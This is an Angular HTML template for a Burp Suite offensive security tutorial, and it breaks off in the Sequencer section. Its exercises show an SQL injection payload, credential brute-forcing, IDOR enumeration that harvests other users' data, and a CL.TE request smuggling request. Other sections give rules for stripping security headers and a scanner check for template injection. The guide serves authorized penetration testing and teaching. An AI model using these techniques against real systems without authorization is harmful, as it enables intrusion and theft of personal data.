@@ -1,0 +1,2159 @@
+<!-- Mobile Nav Toggle -->
+<button class="nav-toggle" (click)="toggleNav()">&#9776;</button>
+
+<!-- Sidebar Navigation -->
+<nav class="guide-nav" [class.open]="navOpen()">
+  <div class="guide-nav__logo">
+    <span class="guide-nav__logo-icon">&#x1F525;</span>
+    <div>
+      <div class="guide-nav__logo-title">Burp Suite Guide</div>
+      <div class="guide-nav__logo-subtitle">by PinkOffense</div>
+    </div>
+  </div>
+
+  <div class="guide-nav__sections">
+    @for (section of navSections; track section.title) {
+      <div class="guide-nav__group">
+        <div class="guide-nav__group-title">{{ section.title }}</div>
+        @for (link of section.links; track link.id) {
+          <a
+            class="guide-nav__link"
+            [class.active]="activeSection() === link.id"
+            (click)="scrollTo(link.id)"
+            (keydown.enter)="scrollTo(link.id)"
+            tabindex="0"
+            role="button"
+          >
+            <span class="guide-nav__link-icon">{{ link.icon }}</span>
+            <span>{{ link.label }}</span>
+          </a>
+        }
+      </div>
+    }
+  </div>
+</nav>
+
+<!-- Main Content -->
+<main class="guide-main">
+
+  <!-- ===== HERO HEADER ===== -->
+  <header class="guide-hero">
+    <div class="guide-hero__bg"></div>
+    <div class="guide-hero__content">
+      <h1 class="guide-hero__title">Burp Suite Offensive Security Guide</h1>
+      <p class="guide-hero__subtitle">Expert Red Team Edition</p>
+      <div class="guide-hero__badges">
+        <span class="badge badge--pink">Expert Offensive</span>
+        <span class="badge badge--cyan">v2.0 - 2026</span>
+        <span class="badge badge--purple">Red Team Ready</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- ===== OVERVIEW ===== -->
+  <section id="overview" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// GETTING STARTED</span>
+      <h2 class="section-title">Overview</h2>
+    </div>
+
+    <p class="section-intro">
+      Burp Suite is the industry-standard toolkit for web application security testing, used by over
+      <strong>70,000+ security professionals</strong> across <strong>16,000+ organizations</strong> worldwide.
+      Built by PortSwigger, it provides an integrated platform for performing comprehensive security testing
+      of web applications &mdash; from manual exploratory testing to advanced automated scanning. Whether you
+      are conducting a penetration test, hunting for bugs, or performing red team engagements, Burp Suite
+      serves as your primary weapon for discovering and exploiting vulnerabilities in modern web applications.
+    </p>
+
+    <h3>Editions Comparison</h3>
+    <div class="table-wrapper">
+      <table>
+        <thead>
+          <tr>
+            <th>Feature</th>
+            <th>Community</th>
+            <th>Professional</th>
+            <th>Enterprise</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Manual Testing Tools</td>
+            <td class="cell--yes">&#x2705;</td>
+            <td class="cell--yes">&#x2705;</td>
+            <td class="cell--yes">&#x2705;</td>
+          </tr>
+          <tr>
+            <td>Automated Scanner</td>
+            <td class="cell--no">&#x274C;</td>
+            <td class="cell--yes">&#x2705;</td>
+            <td class="cell--yes">&#x2705;</td>
+          </tr>
+          <tr>
+            <td>Intruder Speed</td>
+            <td>Throttled</td>
+            <td>Full Speed</td>
+            <td>Full Speed</td>
+          </tr>
+          <tr>
+            <td>BApp Extensions</td>
+            <td>Limited</td>
+            <td class="cell--yes">&#x2705;</td>
+            <td class="cell--yes">&#x2705;</td>
+          </tr>
+          <tr>
+            <td>Project Files</td>
+            <td class="cell--no">&#x274C;</td>
+            <td class="cell--yes">&#x2705;</td>
+            <td class="cell--yes">&#x2705;</td>
+          </tr>
+          <tr>
+            <td>CI/CD Integration</td>
+            <td class="cell--no">&#x274C;</td>
+            <td class="cell--no">&#x274C;</td>
+            <td class="cell--yes">&#x2705;</td>
+          </tr>
+          <tr>
+            <td>Custom Scan Checks</td>
+            <td class="cell--no">&#x274C;</td>
+            <td class="cell--yes">&#x2705;</td>
+            <td class="cell--yes">&#x2705;</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="info-box">
+      <div class="info-box__header">&#x1F4E2; Latest Version</div>
+      <p>
+        Burp Suite <strong>2026.1.2</strong> introduces improved scanning engine performance,
+        enhanced Bambda support for custom filters, HTTP/2 request smuggling detection,
+        and significant improvements to the Montoya API. Make sure you are running the latest
+        version for full feature support and the newest vulnerability detection capabilities.
+      </p>
+    </div>
+  </section>
+
+  <!-- ===== SETUP ===== -->
+  <section id="setup" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// CONFIGURATION</span>
+      <h2 class="section-title">Setup &amp; Configuration</h2>
+    </div>
+
+    <h3>Installation Requirements</h3>
+    <ul class="requirements-list">
+      <li><strong>Java:</strong> JRE/JDK 17+ (bundled with installer since 2023)</li>
+      <li><strong>RAM:</strong> Minimum 4 GB (8 GB+ recommended for large scans)</li>
+      <li><strong>Disk Space:</strong> 1 GB minimum (10 GB+ for project files)</li>
+      <li><strong>Operating System:</strong> Windows 10+, macOS 11+, Linux (Ubuntu 20.04+, Kali, Parrot)</li>
+      <li><strong>Browser:</strong> Chromium-based or Firefox with proxy support</li>
+      <li><strong>Network:</strong> Proxy-compatible network configuration</li>
+    </ul>
+
+    <h3>Browser Proxy Configuration</h3>
+    <p>Configure your browser to route traffic through Burp Suite's proxy listener:</p>
+    <div class="code-block" data-lang="Configuration">
+      <pre ngNonBindable><code>Proxy Host:  127.0.0.1
+Proxy Port:  8080
+Protocol:    HTTP/HTTPS
+
+# Firefox Manual Proxy Configuration
+HTTP Proxy:    127.0.0.1    Port: 8080
+SSL Proxy:     127.0.0.1    Port: 8080
+No Proxy for:  localhost, 127.0.0.1
+
+# Chrome (use FoxyProxy or system-level proxy)
+--proxy-server=http://127.0.0.1:8080</code></pre>
+    </div>
+
+    <h3>CA Certificate Installation</h3>
+    <p>Install Burp's CA certificate to intercept HTTPS traffic without browser warnings:</p>
+    <div class="steps">
+      <div class="step">
+        <span class="step__number">1</span>
+        <div class="step__content">
+          <strong>Navigate to http://burpsuite</strong> in your proxied browser (or http://127.0.0.1:8080)
+          and click "CA Certificate" to download <code>cacert.der</code>.
+        </div>
+      </div>
+      <div class="step">
+        <span class="step__number">2</span>
+        <div class="step__content">
+          <strong>Firefox:</strong> Settings &rarr; Privacy &amp; Security &rarr; Certificates &rarr;
+          View Certificates &rarr; Authorities &rarr; Import &rarr; Select <code>cacert.der</code> &rarr;
+          Trust for identifying websites.
+        </div>
+      </div>
+      <div class="step">
+        <span class="step__number">3</span>
+        <div class="step__content">
+          <strong>Chrome / System:</strong> Import into system certificate store.
+          On Linux: <code>sudo cp cacert.der /usr/local/share/ca-certificates/burp.crt &amp;&amp; sudo update-ca-certificates</code>
+        </div>
+      </div>
+      <div class="step">
+        <span class="step__number">4</span>
+        <div class="step__content">
+          <strong>Verify:</strong> Visit any HTTPS site and confirm the certificate issuer shows
+          "PortSwigger CA" in your browser's certificate viewer.
+        </div>
+      </div>
+    </div>
+
+    <div class="warning-box">
+      <div class="warning-box__header">&#x26A0;&#xFE0F; Security Warning</div>
+      <p>
+        Installing Burp's CA certificate allows interception of all HTTPS traffic. Only install it in
+        browsers and systems dedicated to testing. <strong>Never install the Burp CA on production systems
+        or personal devices used for sensitive activities.</strong> Remove the certificate when testing is complete.
+      </p>
+    </div>
+
+    <h3>Project Configuration</h3>
+    <p>Optimize Burp Suite for offensive engagements with a tailored project configuration:</p>
+    <div class="code-block" data-lang="JSON">
+      <pre ngNonBindable><code>&#123;
+  "project_options": &#123;
+    "connections": &#123;
+      "platform_authentication": &#123;
+        "prompt_on_authentication_failure": false
+      &#125;,
+      "upstream_proxy": &#123;
+        "servers": []
+      &#125;
+    &#125;,
+    "http": &#123;
+      "redirections": &#123;
+        "follow_redirections": "in_scope_only"
+      &#125;
+    &#125;,
+    "sessions": &#123;
+      "session_handling_rules": &#123;
+        "rules": [
+          &#123;
+            "description": "Auto-update session tokens",
+            "enabled": true,
+            "actions": [
+              &#123;
+                "type": "use_cookies_from_session_handling_cookie_jar"
+              &#125;
+            ]
+          &#125;
+        ]
+      &#125;
+    &#125;,
+    "misc": &#123;
+      "scheduled_tasks": &#123;
+        "tasks": []
+      &#125;
+    &#125;
+  &#125;,
+  "target": &#123;
+    "scope": &#123;
+      "advanced_mode": true,
+      "include": [
+        &#123;
+          "enabled": true,
+          "protocol": "any",
+          "host": "^target\\.com$",
+          "port": "",
+          "file": ""
+        &#125;
+      ],
+      "exclude": [
+        &#123;
+          "enabled": true,
+          "protocol": "any",
+          "host": "^.*\\.google\\.com$"
+        &#125;
+      ]
+    &#125;
+  &#125;
+&#125;</code></pre>
+    </div>
+  </section>
+
+  <!-- ===== PROXY ===== -->
+  <section id="proxy" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// CORE TOOLS</span>
+      <h2 class="section-title">Proxy</h2>
+    </div>
+
+    <p class="section-intro">
+      The Proxy is the heart of Burp Suite, operating as a man-in-the-middle (MitM) between your browser
+      and the target application. It intercepts, inspects, and modifies all HTTP/S traffic flowing between
+      the client and server, giving you complete control over every request and response. This is the
+      foundation upon which all other Burp tools operate.
+    </p>
+
+    <div class="tool-grid">
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F6D1;</div>
+        <h4 class="tool-card__title">Intercept</h4>
+        <p class="tool-card__desc">
+          Capture and modify HTTP/S requests and responses in real-time before they reach
+          the server or browser. Edit headers, parameters, cookies, and body content on the fly.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F4DC;</div>
+        <h4 class="tool-card__title">HTTP History</h4>
+        <p class="tool-card__desc">
+          Complete log of all proxied HTTP traffic with full request/response details.
+          Filter, search, annotate, and send items to other Burp tools for further analysis.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F50C;</div>
+        <h4 class="tool-card__title">WebSockets</h4>
+        <p class="tool-card__desc">
+          Intercept and modify WebSocket messages in both directions. Analyze real-time
+          communication channels for injection points and authentication bypasses.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F310;</div>
+        <h4 class="tool-card__title">Burp Browser</h4>
+        <p class="tool-card__desc">
+          Built-in Chromium browser pre-configured with Burp's proxy and CA certificate.
+          Eliminates setup hassle and provides seamless integration with all Burp tools.
+        </p>
+      </div>
+    </div>
+
+    <h3>Intercept Rules Configuration</h3>
+    <div class="screenshot">
+      <div class="screenshot__bar">
+        <span class="screenshot__dot screenshot__dot--red"></span>
+        <span class="screenshot__dot screenshot__dot--yellow"></span>
+        <span class="screenshot__dot screenshot__dot--green"></span>
+        <span class="screenshot__title">Burp Suite - Proxy &gt; Intercept Rules</span>
+      </div>
+      <div class="screenshot__content">
+        <div class="screenshot__row screenshot__row--header">
+          <span>Enabled</span><span>Operator</span><span>Match Type</span><span>Relationship</span><span>Condition</span>
+        </div>
+        <div class="screenshot__row">
+          <span>[&#x2713;]</span><span>And</span><span>Request</span><span>Is in target scope</span><span>-</span>
+        </div>
+        <div class="screenshot__row">
+          <span>[&#x2713;]</span><span>And</span><span>Content-Type header</span><span>Contains</span><span>text/html</span>
+        </div>
+        <div class="screenshot__row">
+          <span>[&#x2713;]</span><span>Or</span><span>URL</span><span>Matches</span><span>.*\.(js|css|png|jpg|gif)$</span>
+        </div>
+        <div class="screenshot__row">
+          <span>[&#x2713;]</span><span>And</span><span>Method</span><span>Is</span><span>POST</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="exercise">
+      <div class="exercise-header">
+        <span class="exercise-number">1</span>
+        Exercise: Traffic Interception
+      </div>
+      <div class="exercise-body">
+        <p><strong>Objective:</strong> Intercept and modify authentication traffic to understand how the application handles login requests.</p>
+        <ol>
+          <li>Open Burp Suite and ensure the Proxy listener is active on <code>127.0.0.1:8080</code>.</li>
+          <li>Open Burp's built-in browser and navigate to your target application's login page.</li>
+          <li>Enable intercept in the Proxy tab (<strong>Intercept is on</strong>).</li>
+          <li>Enter test credentials and submit the login form.</li>
+          <li>In the intercepted request, identify the authentication parameters (username, password, CSRF token).</li>
+          <li>Modify the request &mdash; try changing the username to <code>admin</code> or adding SQL injection payloads like <code>' OR 1=1--</code> and forward the request.</li>
+        </ol>
+        <p><strong>Expected Result:</strong> You should see the full HTTP request with all parameters, headers, and cookies. Observe the server's response to your modified request.</p>
+      </div>
+    </div>
+
+    <h3>Match &amp; Replace Rules</h3>
+    <p>Automatically modify requests and responses passing through the proxy:</p>
+    <div class="code-block" data-lang="Match &amp; Replace">
+      <pre ngNonBindable><code># Remove security headers from responses
+Type: Response header
+Match: X-Frame-Options: .*
+Replace: [empty]
+
+# Inject custom headers into requests
+Type: Request header
+Match: ^$
+Replace: X-Custom-IP: 127.0.0.1
+
+# Disable CSP for easier XSS testing
+Type: Response header
+Match: Content-Security-Policy: .*
+Replace: [empty]
+
+# Replace User-Agent for fingerprint evasion
+Type: Request header
+Match: User-Agent: .*
+Replace: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+# Enable hidden form fields
+Type: Response body
+Match: type="hidden"
+Replace: type="text"
+
+# Downgrade HTTPS redirects for analysis
+Type: Response header
+Match: Strict-Transport-Security: .*
+Replace: [empty]</code></pre>
+    </div>
+  </section>
+
+  <!-- ===== SCANNER ===== -->
+  <section id="scanner" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// CORE TOOLS</span>
+      <h2 class="section-title">Scanner</h2>
+    </div>
+
+    <p class="section-intro">
+      Burp Scanner is the automated vulnerability detection engine that identifies security flaws in web
+      applications through both passive analysis of proxied traffic and active probing of application
+      endpoints. It leverages PortSwigger's extensive research to detect a wide range of vulnerabilities.
+    </p>
+
+    <div class="info-box">
+      <div class="info-box__header">&#x1F512; Professional Feature</div>
+      <p>
+        The Scanner is available in Burp Suite Professional and Enterprise editions only. Community
+        edition users can leverage passive scanning through extensions like <strong>Retire.js</strong>
+        and <strong>Software Vulnerability Scanner</strong>, but active scanning requires a Professional license.
+      </p>
+    </div>
+
+    <div class="tool-grid">
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F441;</div>
+        <h4 class="tool-card__title">Passive Scanning</h4>
+        <p class="tool-card__desc">
+          Analyzes proxied traffic without sending additional requests. Detects issues like
+          information disclosure, insecure cookies, missing headers, sensitive data exposure,
+          and client-side vulnerabilities from existing responses.
+        </p>
+      </div>
+      <div class="tool-card">
+        <div class="tool-card__icon">&#x1F3AF;</div>
+        <h4 class="tool-card__title">Active Scanning</h4>
+        <p class="tool-card__desc">
+          Sends crafted payloads to application endpoints to detect server-side vulnerabilities.
+          Tests for SQL injection, XSS, command injection, path traversal, SSRF, and dozens of
+          other vulnerability classes with intelligent payload generation.
+        </p>
+      </div>
+    </div>
+
+    <h3>Vulnerability Detection Coverage</h3>
+    <ul class="coverage-list">
+      <li><span class="vuln-tag vuln-tag--critical">Critical</span> SQL Injection (Error-based, Blind, Time-based, Out-of-band)</li>
+      <li><span class="vuln-tag vuln-tag--critical">Critical</span> Cross-Site Scripting (Reflected, Stored, DOM-based)</li>
+      <li><span class="vuln-tag vuln-tag--critical">Critical</span> XML External Entity Injection (XXE)</li>
+      <li><span class="vuln-tag vuln-tag--critical">Critical</span> Server-Side Request Forgery (SSRF)</li>
+      <li><span class="vuln-tag vuln-tag--high">High</span> OS Command Injection</li>
+      <li><span class="vuln-tag vuln-tag--high">High</span> Server-Side Template Injection (SSTI)</li>
+      <li><span class="vuln-tag vuln-tag--high">High</span> Path Traversal / Local File Inclusion</li>
+      <li><span class="vuln-tag vuln-tag--medium">Medium</span> Cross-Site Request Forgery (CSRF)</li>
+      <li><span class="vuln-tag vuln-tag--medium">Medium</span> HTTP Request Smuggling (CL.TE, TE.CL, TE.TE)</li>
+      <li><span class="vuln-tag vuln-tag--medium">Medium</span> Insecure Deserialization</li>
+    </ul>
+
+    <h3>Scan Configuration</h3>
+    <div class="table-wrapper">
+      <table>
+        <thead>
+          <tr>
+            <th>Setting</th>
+            <th>Recommended (Stealth)</th>
+            <th>Recommended (Thorough)</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Scan Speed</td>
+            <td>Slow</td>
+            <td>Normal</td>
+          </tr>
+          <tr>
+            <td>Scan Accuracy</td>
+            <td>Minimize false negatives</td>
+            <td>Minimize false negatives</td>
+          </tr>
+          <tr>
+            <td>Consolidate Frequently Occurring Passive Issues</td>
+            <td>Enabled</td>
+            <td>Disabled</td>
+          </tr>
+          <tr>
+            <td>Follow Redirections</td>
+            <td>In-scope only</td>
+            <td>Always</td>
+          </tr>
+          <tr>
+            <td>Maximum Concurrent Requests</td>
+            <td>2-5</td>
+            <td>10-20</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>Custom Scan Check (BCheck / Extension)</h3>
+    <p>Create custom active scan checks to detect application-specific vulnerabilities:</p>
+    <div class="code-block" data-lang="Java">
+      <pre ngNonBindable><code>// Custom SSTI Detection Scan Check
+public class SSTIDetectionCheck implements ScanCheck &#123;
+
+    private final MontoyaApi api;
+    private static final Map&lt;String, String&gt; SSTI_PAYLOADS = Map.of(
+        "&#123;&#123;7*7&#125;&#125;",           "49",        // Jinja2 / Twig
+        "$&#123;7*7&#125;",              "49",        // FreeMarker / EL
+        "#&#123;7*7&#125;",              "49",        // Thymeleaf
+        "&lt;%= 7*7 %&gt;",          "49",        // ERB
+        "&#123;&#123;= 7*7 &#125;&#125;",          "49"         // Handlebars
+    );
+
+    public SSTIDetectionCheck(MontoyaApi api) &#123;
+        this.api = api;
+    &#125;
+
+    &#64;Override
+    public AuditResult activeAudit(
+            HttpRequestResponse baseRequestResponse,
+            AuditInsertionPoint insertionPoint) &#123;
+
+        List&lt;AuditIssue&gt; issues = new ArrayList&lt;&gt;();
+
+        for (var entry : SSTI_PAYLOADS.entrySet()) &#123;
+            String payload = entry.getKey();
+            String expected = entry.getValue();
+
+            HttpRequest checkRequest = insertionPoint
+                .buildHttpRequestWithPayload(
+                    ByteArray.byteArray(payload));
+
+            HttpRequestResponse response = api.http()
+                .sendRequest(checkRequest);
+
+            if (response.response().bodyToString()
+                    .contains(expected)) &#123;
+                issues.add(AuditIssue.auditIssue(
+                    "Server-Side Template Injection",
+                    "The parameter appears vulnerable to SSTI"
+                        + " using payload: " + payload,
+                    null,
+                    baseRequestResponse.request().url(),
+                    AuditIssueSeverity.HIGH,
+                    AuditIssueConfidence.CERTAIN,
+                    null, null,
+                    AuditIssueSeverity.HIGH,
+                    response
+                ));
+            &#125;
+        &#125;
+        return AuditResult.auditResult(issues);
+    &#125;
+&#125;</code></pre>
+    </div>
+
+    <div class="exercise">
+      <div class="exercise-header">
+        <span class="exercise-number">2</span>
+        Exercise: Targeted Scanning
+      </div>
+      <div class="exercise-body">
+        <p><strong>Objective:</strong> Configure and execute a targeted active scan against specific endpoints to discover vulnerabilities efficiently.</p>
+        <ol>
+          <li>Browse the target application through Burp Proxy to populate the Site Map.</li>
+          <li>In the Target tab, right-click a specific endpoint (e.g., a search function or login form).</li>
+          <li>Select <strong>"Scan" &rarr; "Active scan"</strong> from the context menu.</li>
+          <li>Configure scan settings: set scan speed to "Normal", enable all insertion points.</li>
+          <li>Monitor the scan progress in the Dashboard tab and review discovered issues.</li>
+          <li>Validate each finding manually using Repeater before including it in your report.</li>
+        </ol>
+        <p><strong>Pro Tip:</strong> Always start with a narrow scope and expand. Scanning entire applications can be noisy and generate thousands of requests.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== INTRUDER ===== -->
+  <section id="intruder" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// CORE TOOLS</span>
+      <h2 class="section-title">Intruder</h2>
+    </div>
+
+    <p class="section-intro">
+      Intruder is Burp Suite's powerful fuzzing and brute-force engine, designed for automated customized
+      attacks against web applications. It allows you to define payload positions within HTTP requests
+      and systematically inject payloads using various attack strategies. Intruder excels at credential
+      brute-forcing, parameter fuzzing, IDOR enumeration, and vulnerability discovery at scale.
+    </p>
+
+    <h3>Attack Types</h3>
+    <div class="attack-types-grid">
+      <div class="attack-type">
+        <h4>&#x1F3AF; Sniper</h4>
+        <p>
+          Tests one payload position at a time using a single payload set. Each payload is inserted
+          into each position individually while other positions retain their original values. Best
+          for targeted fuzzing of individual parameters.
+        </p>
+        <p><strong>Example:</strong> 3 positions &times; 100 payloads = 300 requests</p>
+      </div>
+      <div class="attack-type">
+        <h4>&#x1F528; Battering Ram</h4>
+        <p>
+          Uses a single payload set and inserts the same payload into all defined positions
+          simultaneously. Useful when the same value needs to appear in multiple places in
+          a request (e.g., CSRF token in header and body).
+        </p>
+        <p><strong>Example:</strong> 3 positions &times; 100 payloads = 100 requests</p>
+      </div>
+      <div class="attack-type">
+        <h4>&#x1F500; Pitchfork</h4>
+        <p>
+          Uses multiple payload sets (one per position) and iterates through them in parallel.
+          Payload 1 from set A goes with payload 1 from set B, etc. Ideal for testing known
+          credential pairs or correlated data.
+        </p>
+        <p><strong>Example:</strong> 2 positions &times; 100 paired payloads = 100 requests</p>
+      </div>
+      <div class="attack-type">
+        <h4>&#x1F4A3; Cluster Bomb</h4>
+        <p>
+          Uses multiple payload sets and tests every combination (Cartesian product). Tries all
+          permutations of payloads across all positions. The most thorough but generates the
+          most requests. Use with caution on rate-limited targets.
+        </p>
+        <p><strong>Example:</strong> 2 positions &times; 100 + 50 payloads = 5,000 requests</p>
+      </div>
+    </div>
+
+    <h3>Payload Positions</h3>
+    <div class="screenshot">
+      <div class="screenshot__bar">
+        <span class="screenshot__dot screenshot__dot--red"></span>
+        <span class="screenshot__dot screenshot__dot--yellow"></span>
+        <span class="screenshot__dot screenshot__dot--green"></span>
+        <span class="screenshot__title">Burp Suite - Intruder &gt; Positions</span>
+      </div>
+      <div class="screenshot__content">
+<pre class="screenshot__code">POST /api/login HTTP/1.1
+Host: target.com
+Content-Type: application/json
+Cookie: session=abc123
+
+&#123;
+  "username": "&#xa7;admin&#xa7;",
+  "password": "&#xa7;password123&#xa7;"
+&#125;</pre>
+        <p class="screenshot__note">&#xa7; markers indicate payload insertion points</p>
+      </div>
+    </div>
+
+    <h3>Payload Types</h3>
+    <div class="table-wrapper">
+      <table>
+        <thead>
+          <tr>
+            <th>Payload Type</th>
+            <th>Description</th>
+            <th>Use Case</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Simple List</td>
+            <td>Custom or imported list of strings</td>
+            <td>Wordlists, usernames, common passwords</td>
+          </tr>
+          <tr>
+            <td>Numbers</td>
+            <td>Sequential or random numeric values</td>
+            <td>IDOR enumeration, ID brute-forcing</td>
+          </tr>
+          <tr>
+            <td>Recursive Grep</td>
+            <td>Extracts payload from previous response</td>
+            <td>CSRF token extraction, session chaining</td>
+          </tr>
+          <tr>
+            <td>Brute Forcer</td>
+            <td>Character-set based permutation generator</td>
+            <td>Short token/PIN brute-forcing</td>
+          </tr>
+          <tr>
+            <td>Username Generator</td>
+            <td>Generates username permutations from names</td>
+            <td>User enumeration (jsmith, j.smith, smithj)</td>
+          </tr>
+          <tr>
+            <td>Extension-Generated</td>
+            <td>Payloads generated by Burp extensions</td>
+            <td>Custom payload logic, dynamic values</td>
+          </tr>
+          <tr>
+            <td>Copy Other Payload</td>
+            <td>Mirrors payload from another position</td>
+            <td>Duplicate values across parameters</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>Payload Processing Rules</h3>
+    <div class="code-block" data-lang="Payload Processing">
+      <pre ngNonBindable><code># Add prefix/suffix
+Rule: Add prefix    =&gt;  admin_
+Rule: Add suffix    =&gt;  _2026
+
+# Encode payloads
+Rule: URL-encode all characters
+Rule: Base64-encode
+Rule: Hash: MD5 / SHA-256
+
+# Match / Replace within payload
+Rule: Match regex    =&gt;  \s+
+Rule: Replace with   =&gt;  %20
+
+# Case modification
+Rule: To lowercase
+Rule: Invoke Burp extension  =&gt;  Hackvertor</code></pre>
+    </div>
+
+    <h3>Grep Matching</h3>
+    <p>Configure response matching to identify successful attacks:</p>
+    <div class="code-block" data-lang="Grep Match">
+      <pre ngNonBindable><code># Flag responses containing success indicators
+Grep Match:
+  - "Welcome"
+  - "Dashboard"
+  - "Login successful"
+  - "authenticated"
+
+# Flag responses NOT containing error messages
+Grep Match (Negative):
+  - "Invalid credentials"
+  - "Account locked"
+  - "Rate limit exceeded"
+
+# Extract data from responses
+Grep Extract:
+  - Start: "csrf_token" value="
+  - End: "
+  - Group: 0
+
+# Grep Payloads (flag if payload reflected)
+Enabled: true</code></pre>
+    </div>
+
+    <div class="exercise">
+      <div class="exercise-header">
+        <span class="exercise-number">3</span>
+        Exercise: Credential Brute Force
+      </div>
+      <div class="exercise-body">
+        <p><strong>Objective:</strong> Use Intruder's Cluster Bomb attack to brute-force login credentials.</p>
+        <ol>
+          <li>Intercept a login request in the Proxy and send it to Intruder (Ctrl+I).</li>
+          <li>Clear all auto-detected positions, then highlight the username and password values and click "Add &#xa7;".</li>
+          <li>Set attack type to <strong>Cluster Bomb</strong>.</li>
+          <li>Configure Payload Set 1 (username): Load a username wordlist (e.g., <code>/usr/share/seclists/Usernames/top-usernames-shortlist.txt</code>).</li>
+          <li>Configure Payload Set 2 (password): Load a password wordlist (e.g., <code>/usr/share/seclists/Passwords/Common-Credentials/best110.txt</code>).</li>
+          <li>Add Grep Match rules for "Welcome", "Dashboard", or any success indicator.</li>
+          <li>Start the attack and sort results by status code or grep match column.</li>
+        </ol>
+        <p><strong>Expected Result:</strong> Valid credential pairs will show different response lengths and matching grep indicators compared to failed attempts.</p>
+      </div>
+    </div>
+
+    <div class="exercise">
+      <div class="exercise-header">
+        <span class="exercise-number">4</span>
+        Exercise: IDOR Enumeration
+      </div>
+      <div class="exercise-body">
+        <p><strong>Objective:</strong> Enumerate Insecure Direct Object References (IDOR) to access other users' data.</p>
+        <ol>
+          <li>Identify a request that includes a user-specific identifier (e.g., <code>/api/users/1042/profile</code>).</li>
+          <li>Send the request to Intruder and mark the ID value (<code>1042</code>) as a payload position.</li>
+          <li>Set attack type to <strong>Sniper</strong>.</li>
+          <li>Configure payload type as <strong>Numbers</strong>: From 1, To 2000, Step 1.</li>
+          <li>Add Grep Extract rules to extract usernames, emails, or other PII from responses.</li>
+          <li>Start the attack and analyze responses for data belonging to other users.</li>
+        </ol>
+        <p><strong>Expected Result:</strong> Responses with status 200 and valid data indicate accessible user profiles. Compare with 403/404 responses to confirm the vulnerability.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== REPEATER ===== -->
+  <section id="repeater" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// CORE TOOLS</span>
+      <h2 class="section-title">Repeater</h2>
+    </div>
+
+    <p class="section-intro">
+      Repeater is Burp Suite's manual testing workbench, allowing you to craft, modify, and resend
+      individual HTTP requests while inspecting the responses in detail. It is the go-to tool for
+      manual vulnerability validation, payload refinement, and understanding application behavior.
+      Unlike Intruder, Repeater gives you full control over every aspect of each request.
+    </p>
+
+    <h3>Key Features</h3>
+    <ul class="feature-list">
+      <li><strong>Request/Response Side-by-Side:</strong> View and edit requests with immediate response feedback</li>
+      <li><strong>Multiple Tabs:</strong> Maintain multiple request/response pairs for comparison and chaining</li>
+      <li><strong>HTTP/2 Support:</strong> Full HTTP/2 request manipulation including header ordering and pseudo-headers</li>
+      <li><strong>Auto-Content-Length:</strong> Automatically updates Content-Length header when body is modified</li>
+      <li><strong>Follow Redirections:</strong> Configurable redirect behavior (never, on-site only, always)</li>
+      <li><strong>Request History:</strong> Navigate through previous modifications with undo/redo</li>
+      <li><strong>Inspector Panel:</strong> Structured view of request components (headers, parameters, cookies)</li>
+      <li><strong>Send to Other Tools:</strong> Forward requests to Intruder, Scanner, Comparer, or Organizer</li>
+    </ul>
+
+    <h3>Request Manipulation Techniques</h3>
+    <div class="info-box">
+      <div class="info-box__header">&#x1F527; Repeater Tips</div>
+      <p>
+        Use Repeater to iteratively refine payloads. Start with a basic proof-of-concept, observe the
+        response, adjust your payload, and repeat. The tab-based workflow allows you to maintain a
+        history of your testing progression. Name your tabs descriptively (e.g., "SQLi - users table",
+        "XSS - reflected", "SSRF - internal") to stay organized during complex engagements.
+      </p>
+    </div>
+
+    <div class="exercise">
+      <div class="exercise-header">
+        <span class="exercise-number">5</span>
+        Exercise: HTTP Request Smuggling (CL.TE)
+      </div>
+      <div class="exercise-body">
+        <p><strong>Objective:</strong> Exploit a CL.TE request smuggling vulnerability using Repeater.</p>
+        <div class="code-block" data-lang="HTTP">
+          <pre ngNonBindable><code>POST / HTTP/1.1
+Host: vulnerable-target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED</code></pre>
+        </div>
+        <ol>
+          <li>Send the above request in Repeater. Ensure "Update Content-Length" is <strong>unchecked</strong>.</li>
+          <li>The front-end server uses <code>Content-Length</code> (13 bytes), forwarding the complete body.</li>
+          <li>The back-end server uses <code>Transfer-Encoding: chunked</code>, treating <code>0\r\n\r\n</code> as end of request.</li>
+          <li>The remaining <code>SMUGGLED</code> text becomes the start of the next request in the pipeline.</li>
+          <li>Send the request twice quickly &mdash; the second response should reflect the smuggled content.</li>
+          <li>Escalate by smuggling a request that accesses another user's session or internal endpoints.</li>
+        </ol>
+        <div class="warning-box">
+          <div class="warning-box__header">&#x26A0;&#xFE0F; Important</div>
+          <p>
+            Request smuggling can affect other users on shared infrastructure. Only test on
+            targets where you have explicit authorization. Use Burp's HTTP/2 downgrade features
+            for testing modern servers.
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== SEQUENCER ===== -->
+  <section id="sequencer" class="guide-section">
+    <div class="section-header">
+      <span class="section-label">// ADVANCED TOOLS</span>
+      <h2 class="section-title">Sequencer</h2>
+    </div>
+
+    <p class="section-intro">
+      Sequencer performs statistical analysis on tokens to evaluate their randomness and unpredictability.
+      It is essential for assessing the quality of session tokens, CSRF tokens, password reset tokens,
+      and any other security-critical random values generated by the application. Weak randomness can
